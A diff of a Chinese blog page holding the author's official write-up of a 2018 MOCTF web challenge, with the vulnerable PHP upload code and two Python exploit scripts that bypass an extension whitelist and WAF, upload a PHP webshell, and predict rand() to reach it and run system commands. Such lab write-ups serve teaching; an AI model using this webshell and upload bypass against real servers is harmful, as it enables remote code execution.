@@ -21,7 +21,7 @@
 <meta property="og:image" content="https://www.codemonster.cn/img/2018moctf4.png">
 <meta property="og:image" content="https://www.codemonster.cn/img/2018moctf5.png">
 <meta property="og:image" content="https://www.codemonster.cn/img/2018moctf6.png">
-<meta property="og:updated_time" content="2018-05-04T07:47:50.014Z">
+<meta property="og:updated_time" content="2018-07-28T06:19:47.791Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="2018 MOCTF 新春欢乐赛 部分WriteUp+感想">
 <meta name="twitter:description" content="从放假到现在筹办准备了接近两个星期的MOCTF新春欢乐赛终于落幕啦，这次比赛我一共出了1签到+1MISC+3WEB，下面先放官方WriteUp（哇终于能当一回官方了）">
@@ -203,7 +203,7 @@
 <h3 id="简单审计-400"><a href="#简单审计-400" class="headerlink" title="简单审计 400"></a>简单审计 400</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">代码都给你了，还说不会做？</div><div class="line">http://120.78.57.208:6005/</div></pre></td></tr></table></figure>
 <p>index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</div><div class="line">header(<span class="string">"Content-type:text/html;charset=utf-8"</span>);</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_rand_code</span><span class="params">($l = <span class="number">6</span>)</span> </span>&#123;</div><div class="line">    $result = <span class="string">''</span>;</div><div class="line">    <span class="keyword">while</span>($l--) &#123;</div><div class="line">        $result .= chr(rand(ord(<span class="string">'a'</span>), ord(<span class="string">'z'</span>)));</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $result;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">test_rand_code</span><span class="params">()</span> </span>&#123;</div><div class="line">    $ip=$_SERVER[<span class="string">'REMOTE_ADDR'</span>];</div><div class="line">    $code=get_rand_code();</div><div class="line">    $socket = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP);</div><div class="line">    @socket_connect($socket, $ip, <span class="number">8888</span>);</div><div class="line">    @socket_write($socket, $code.PHP_EOL);</div><div class="line">    @socket_close($socket);</div><div class="line">    <span class="keyword">die</span>(<span class="string">'test ok!'</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($filename, $content,$savepath)</span> </span>&#123;</div><div class="line">    $AllowedExt = <span class="keyword">array</span>(<span class="string">'bmp'</span>,<span class="string">'gif'</span>,<span class="string">'jpeg'</span>,<span class="string">'jpg'</span>,<span class="string">'png'</span>);</div><div class="line">    <span class="keyword">if</span>(!is_array($filename)) &#123;</div><div class="line">        $filename = explode(<span class="string">'.'</span>, $filename);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>(!in_array(strtolower($filename[count($filename)<span class="number">-1</span>]),$AllowedExt))&#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'error ext!'</span>);</div><div class="line">    &#125;</div><div class="line">    $code=get_rand_code();</div><div class="line">    $finalname=$filename[<span class="number">0</span>].<span class="string">'moctf'</span>.$code.<span class="string">"."</span>.end($filename);</div><div class="line">    file_put_contents(<span class="string">"$savepath"</span>.$finalname, $content);</div><div class="line">    usleep(<span class="number">3000000</span>);</div><div class="line">    unlink(<span class="string">"$savepath"</span>.$finalname);</div><div class="line">    <span class="keyword">die</span>(<span class="string">'upload over!'</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$savepath=<span class="string">"uploads/"</span>.sha1($_SERVER[<span class="string">'REMOTE_ADDR'</span>]).<span class="string">"/"</span>;</div><div class="line"><span class="keyword">if</span>(!is_dir($savepath))&#123;</div><div class="line">    $oldmask = umask(<span class="number">0</span>);</div><div class="line">    mkdir($savepath, <span class="number">0777</span>);</div><div class="line">    umask($oldmask);</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]))</div><div class="line">&#123;</div><div class="line">    $act=$_GET[<span class="string">'action'</span>];</div><div class="line">    <span class="keyword">if</span>($act===<span class="string">'upload'</span>)</div><div class="line">    &#123;</div><div class="line">        $filename=$_POST[<span class="string">'filename'</span>];</div><div class="line">        <span class="keyword">if</span>(!is_array($filename)) &#123;</div><div class="line">            $filename = explode(<span class="string">'.'</span>, $filename);</div><div class="line">        &#125;</div><div class="line">        $content=$_POST[<span class="string">'content'</span>];</div><div class="line">        waf($content);</div><div class="line">        upload($filename,$content,$savepath);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($act===<span class="string">'test'</span>)</div><div class="line">    &#123;</div><div class="line">        test_rand_code();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line">    highlight_file(<span class="string">'index.php'</span>);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
 <p>解释一下题目的意思<br>根据action执行对应操作，<code>action=test</code>会调用<code>test_rand_code</code>函数发送tcp包到访客的ip<br><code>action=upload</code>时会写入一个文件，文件内容有waf拦截，文件名有白名单限制后缀，<br>然后拼接文件名加入rand的字符串，写入文件，文件写入后过3秒unlink删除<br>有问题的点有这几个<br>1.filename检查是用<code>$filename[count($filename)-1]</code>取的后缀，是按照下标取的，而写入文件时用的是<code>end($filename)</code>，是取最后一个元素，只要post时提交<code>filename[1]=jpg&amp;filename[0]=php</code>就能绕过了<br>2.$content的waf绕过，<script language="php">xxxx</script> 绕过即可<br>3.使用rand()生成随机数，可以被预测，参考<a href="https://www.sjoerdlangkemper.nl/2016/02/11/cracking-php-rand/" target="_blank" rel="noopener">https://www.sjoerdlangkemper.nl/2016/02/11/cracking-php-rand/</a></p>
-<p>预期解法是<br>1.username数组bypass后缀检查，绕过content的waf<br>2.rand随机数预测+爆破文件名 在unlink之前访问shell<br>结果大佬们直接非预期解bypass了<code>unlink</code>打扰了<br>非预期解参考<a href="http://skysec.top/2018/02/13/happymoctf之web全题解/" target="_blank" rel="noopener">一叶飘零</a>师傅的WriteUp<br>预期解如下<br>写两个脚本，<br>listen.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#监听8888端口，接受6个`get_rand_code`的结果，然后预测接下来一次`get_rand_code`的结果，这里可能不会很准确，</span></div><div class="line"><span class="comment">#所以需要小幅度爆破，复杂度大概为3^6，反正就跑着呗</span></div><div class="line"></div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"><span class="comment">#by xishir</span></div><div class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *  </div><div class="line"><span class="keyword">from</span> time <span class="keyword">import</span> ctime  </div><div class="line"><span class="keyword">import</span> random</div><div class="line"><span class="keyword">import</span> itertools <span class="keyword">as</span> its</div><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"></div><div class="line">r=req.session() </div><div class="line">url=<span class="string">"http://120.78.57.208:6005/"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_rand_list</span><span class="params">()</span>:</span></div><div class="line">    HOST = <span class="string">''</span>  </div><div class="line">    PORT = <span class="number">8888</span></div><div class="line">    BUFSIZ = <span class="number">128</span>  </div><div class="line">    ADDR = (HOST, PORT)  </div><div class="line">    tcpSerSock = socket(AF_INET, SOCK_STREAM)</div><div class="line">    tcpSerSock.bind(ADDR)</div><div class="line">    tcpSerSock.listen(<span class="number">5</span>)</div><div class="line">    rand_num=<span class="number">0</span></div><div class="line">    l=[]</div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        tcpCliSock, addr = tcpSerSock.accept()  </div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:  </div><div class="line">            data = tcpCliSock.recv(BUFSIZ)  </div><div class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:  </div><div class="line">                <span class="keyword">break</span>  </div><div class="line">            data=data[<span class="number">0</span>:<span class="number">6</span>]</div><div class="line">	    <span class="keyword">print</span> data,l</div><div class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> data:</div><div class="line">                l.append(ord(i)+<span class="number">1</span>-ord(<span class="string">'a'</span>))</div><div class="line">        rand_num+=<span class="number">1</span></div><div class="line">      	<span class="keyword">if</span> rand_num==<span class="number">6</span>:</div><div class="line">      		<span class="keyword">break</span></div><div class="line">    tcpCliSock.close()  </div><div class="line">    tcpSerSock.close()</div><div class="line">    <span class="keyword">return</span> l</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_salt</span><span class="params">(l)</span>:</span></div><div class="line">    salt=<span class="string">""</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</div><div class="line">        j=len(l)</div><div class="line">        r=(l[j<span class="number">-3</span>]+l[j<span class="number">-31</span>])<span class="number">-1</span></div><div class="line">        <span class="keyword">if</span> r&gt;<span class="number">26</span>:</div><div class="line">        	r-=<span class="number">26</span></div><div class="line">        <span class="comment">#print l[j-3],chr(l[j-3]+ord('a')-1),l[j-31],chr(l[j-31]+ord('a')-1),r,chr(r+ord('a')-1)</span></div><div class="line">        l.append(r)</div><div class="line">        salt+=chr(r+ord(<span class="string">'a'</span>)<span class="number">-1</span>)</div><div class="line">        <span class="comment">#print salt</span></div><div class="line">    <span class="keyword">return</span> salt</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(salt)</span>:</span></div><div class="line">    s=hashlib.sha1(<span class="string">'119.23.73.3'</span>).hexdigest()</div><div class="line">    url1=url+<span class="string">'/uploads/'</span>+s+<span class="string">'/'</span>+<span class="string">'moctf'</span>+salt+<span class="string">'.php'</span></div><div class="line">    data=&#123;<span class="string">"a"</span>:<span class="string">"system('cat ../../flag.php');echo '666666';"</span>&#125;</div><div class="line">    r2=r.post(url1,data=data)</div><div class="line">    <span class="keyword">print</span> salt</div><div class="line">    <span class="keyword">if</span> <span class="string">'404'</span> <span class="keyword">not</span> <span class="keyword">in</span> r2.text:</div><div class="line">    	<span class="keyword">print</span> r2.text</div><div class="line"></div><div class="line">get_flag(<span class="string">'aaaaaa'</span>)</div><div class="line">l=get_rand_list()</div><div class="line">salt=get_salt(l)</div><div class="line">s=<span class="number">0</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100000</span>):</div><div class="line">	s=s+<span class="number">1</span></div><div class="line"><span class="keyword">print</span> s</div><div class="line">words = <span class="string">"10"</span></div><div class="line">o=its.product(words,repeat=<span class="number">6</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> o:</div><div class="line">	s=<span class="string">""</span>.join(i)</div><div class="line">	salt2=<span class="string">""</span></div><div class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">6</span>):</div><div class="line">	    salt2+=chr(ord(salt[j])-int(s[j]))</div><div class="line">	get_flag(salt2)</div><div class="line">words = <span class="string">"10"</span></div><div class="line">o=its.product(words,repeat=<span class="number">6</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> o:</div><div class="line">	s=<span class="string">""</span>.join(i)</div><div class="line">	salt2=<span class="string">""</span></div><div class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">6</span>):</div><div class="line">	    salt2+=chr(ord(salt[j])+int(s[j]))</div><div class="line">	get_flag(salt2)</div></pre></td></tr></table></figure></p>
+<p>预期解法是<br>1.username数组bypass后缀检查，绕过content的waf<br>2.rand随机数预测+爆破文件名 在unlink之前访问shell<br>结果大佬们直接非预期解bypass了<code>unlink</code>打扰了<br>非预期解参考<a href="http://skysec.top/2018/02/13/happymoctf之web全题解/" target="_blank" rel="noopener">一叶飘零</a>师傅的WriteUp<br>预期解如下<br>写两个脚本，<br>listen.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#监听8888端口，接受6个`get_rand_code`的结果，然后预测接下来一次`get_rand_code`的结果，这里可能不会很准确，</span></div><div class="line"><span class="comment">#所以需要小幅度爆破，复杂度大概为3^6，反正就跑着呗</span></div><div class="line"></div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"><span class="comment">#by xishir</span></div><div class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *  </div><div class="line"><span class="keyword">from</span> time <span class="keyword">import</span> ctime  </div><div class="line"><span class="keyword">import</span> random</div><div class="line"><span class="keyword">import</span> itertools <span class="keyword">as</span> its</div><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"></div><div class="line">r=req.session()</div><div class="line">url=<span class="string">"http://120.78.57.208:6005/"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_rand_list</span><span class="params">()</span>:</span></div><div class="line">    HOST = <span class="string">''</span>  </div><div class="line">    PORT = <span class="number">8888</span></div><div class="line">    BUFSIZ = <span class="number">128</span>  </div><div class="line">    ADDR = (HOST, PORT)  </div><div class="line">    tcpSerSock = socket(AF_INET, SOCK_STREAM)</div><div class="line">    tcpSerSock.bind(ADDR)</div><div class="line">    tcpSerSock.listen(<span class="number">5</span>)</div><div class="line">    rand_num=<span class="number">0</span></div><div class="line">    l=[]</div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        tcpCliSock, addr = tcpSerSock.accept()  </div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:  </div><div class="line">            data = tcpCliSock.recv(BUFSIZ)  </div><div class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:  </div><div class="line">                <span class="keyword">break</span>  </div><div class="line">            data=data[<span class="number">0</span>:<span class="number">6</span>]</div><div class="line">	    <span class="keyword">print</span> data,l</div><div class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> data:</div><div class="line">                l.append(ord(i)+<span class="number">1</span>-ord(<span class="string">'a'</span>))</div><div class="line">        rand_num+=<span class="number">1</span></div><div class="line">      	<span class="keyword">if</span> rand_num==<span class="number">6</span>:</div><div class="line">      		<span class="keyword">break</span></div><div class="line">    tcpCliSock.close()  </div><div class="line">    tcpSerSock.close()</div><div class="line">    <span class="keyword">return</span> l</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_salt</span><span class="params">(l)</span>:</span></div><div class="line">    salt=<span class="string">""</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</div><div class="line">        j=len(l)</div><div class="line">        r=(l[j<span class="number">-3</span>]+l[j<span class="number">-31</span>])<span class="number">-1</span></div><div class="line">        <span class="keyword">if</span> r&gt;<span class="number">26</span>:</div><div class="line">        	r-=<span class="number">26</span></div><div class="line">        <span class="comment">#print l[j-3],chr(l[j-3]+ord('a')-1),l[j-31],chr(l[j-31]+ord('a')-1),r,chr(r+ord('a')-1)</span></div><div class="line">        l.append(r)</div><div class="line">        salt+=chr(r+ord(<span class="string">'a'</span>)<span class="number">-1</span>)</div><div class="line">        <span class="comment">#print salt</span></div><div class="line">    <span class="keyword">return</span> salt</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(salt)</span>:</span></div><div class="line">    s=hashlib.sha1(<span class="string">'119.23.73.3'</span>).hexdigest()</div><div class="line">    url1=url+<span class="string">'/uploads/'</span>+s+<span class="string">'/'</span>+<span class="string">'moctf'</span>+salt+<span class="string">'.php'</span></div><div class="line">    data=&#123;<span class="string">"a"</span>:<span class="string">"system('cat ../../flag.php');echo '666666';"</span>&#125;</div><div class="line">    r2=r.post(url1,data=data)</div><div class="line">    <span class="keyword">print</span> salt</div><div class="line">    <span class="keyword">if</span> <span class="string">'404'</span> <span class="keyword">not</span> <span class="keyword">in</span> r2.text:</div><div class="line">    	<span class="keyword">print</span> r2.text</div><div class="line"></div><div class="line">get_flag(<span class="string">'aaaaaa'</span>)</div><div class="line">l=get_rand_list()</div><div class="line">salt=get_salt(l)</div><div class="line">s=<span class="number">0</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100000</span>):</div><div class="line">	s=s+<span class="number">1</span></div><div class="line"><span class="keyword">print</span> s</div><div class="line">words = <span class="string">"10"</span></div><div class="line">o=its.product(words,repeat=<span class="number">6</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> o:</div><div class="line">	s=<span class="string">""</span>.join(i)</div><div class="line">	salt2=<span class="string">""</span></div><div class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">6</span>):</div><div class="line">	    salt2+=chr(ord(salt[j])-int(s[j]))</div><div class="line">	get_flag(salt2)</div><div class="line">words = <span class="string">"10"</span></div><div class="line">o=its.product(words,repeat=<span class="number">6</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> o:</div><div class="line">	s=<span class="string">""</span>.join(i)</div><div class="line">	salt2=<span class="string">""</span></div><div class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">6</span>):</div><div class="line">	    salt2+=chr(ord(salt[j])+int(s[j]))</div><div class="line">	get_flag(salt2)</div></pre></td></tr></table></figure></p>
 <p>put.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#通过`?action=test`调用`test_rand_code`函数发送6次`get_rand_code`结果，一共36个字符，</span></div><div class="line"><span class="comment">#然后提交一个构造好的`?action=test`，上传shell到服务器，在被删除之前就会被listen爆破得到，没爆破到就多爆破几次</span></div><div class="line"></div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"><span class="comment">#by xishir</span></div><div class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line">r=req.session()</div><div class="line">url=<span class="string">"http://120.78.57.208:6005/?action="</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_test</span><span class="params">()</span>:</span></div><div class="line">    url2=url+<span class="string">"test"</span></div><div class="line">    r1=r.get(url2)</div><div class="line">    <span class="keyword">print</span> url2</div><div class="line">    <span class="keyword">print</span> r1.text</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></div><div class="line">    data=&#123;<span class="string">"filename[4]"</span>:<span class="string">"jpg"</span>,</div><div class="line">          <span class="string">"filename[2]"</span>:<span class="string">"jpg"</span>,</div><div class="line">          <span class="string">"filename[1]"</span>:<span class="string">"php"</span>,</div><div class="line">          <span class="string">"content"</span>:<span class="string">"&lt;script language='php'&gt;assert($_POST[a]);&lt;/script&gt;"</span>,</div><div class="line">          <span class="string">"a"</span>:<span class="string">"system('cat ../../flag.php');"</span></div><div class="line">          &#125;</div><div class="line">    url1=url+<span class="string">"upload"</span></div><div class="line">    r2=r.post(url1,data=data)</div><div class="line">    <span class="keyword">print</span> r2.text</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</div><div class="line">    get_test()</div><div class="line">upload()</div></pre></td></tr></table></figure></p>
 <p>运行结果如下<br><img src="/img/2018moctf2.png" alt=""></p>
 <h1 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h1><p>讲一下这次比赛我主要干了那些事吧</p>
@@ -382,15 +382,6 @@
   
 
   
-  <div id="SOHUCS" sid="2018-moctf-happy-writeup" style="padding: 0px 30px 0px 46px;"></div> 
-<script type="text/javascript"> 
-(function(){ 
-var appid = "cytc4BpeT"; 
-var conf = "prod_bc3a17ee08a3aa3dab4d478a72fc4906"; 
-var width = window.innerWidth || document.documentElement.clientWidth; 
-if (width < 960) { 
-window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="//changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf + '"><\/script>'); } else { var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("//changyan.sohu.com/upload/changyan.js",function(){window.changyan.api.config({appid:appid,conf:conf})}); } })(); </script>
-  
 
   
 
@@ -508,15 +499,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">渗透</a>
+                <a href="javascript:void(0)" class="js-tag color4">AWD</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">WriteUp</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">AWD</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -544,6 +531,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">MISC</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">审计</a>
               </li>
              
@@ -552,15 +543,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">MISC</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">文件包含</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">编辑器泄露</a>
+                <a href="javascript:void(0)" class="js-tag color5">Misc</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -568,11 +551,43 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">加固</a>
+                <a href="javascript:void(0)" class="js-tag color5">CBC字节翻转攻击</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Padding oracle攻击</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">SQL注入</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">上传</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">反序列化</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">文件包含</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">盲注</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">编辑器泄露</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">加固</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Crypto</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -588,23 +603,43 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Crypto</a>
+                <a href="javascript:void(0)" class="js-tag color5">流量分析</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Misc</a>
+                <a href="javascript:void(0)" class="js-tag color3">渗透</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">SQL注入</a>
+                <a href="javascript:void(0)" class="js-tag color3">Struts2</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">反序列化</a>
+                <a href="javascript:void(0)" class="js-tag color2">apache</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">盲注</a>
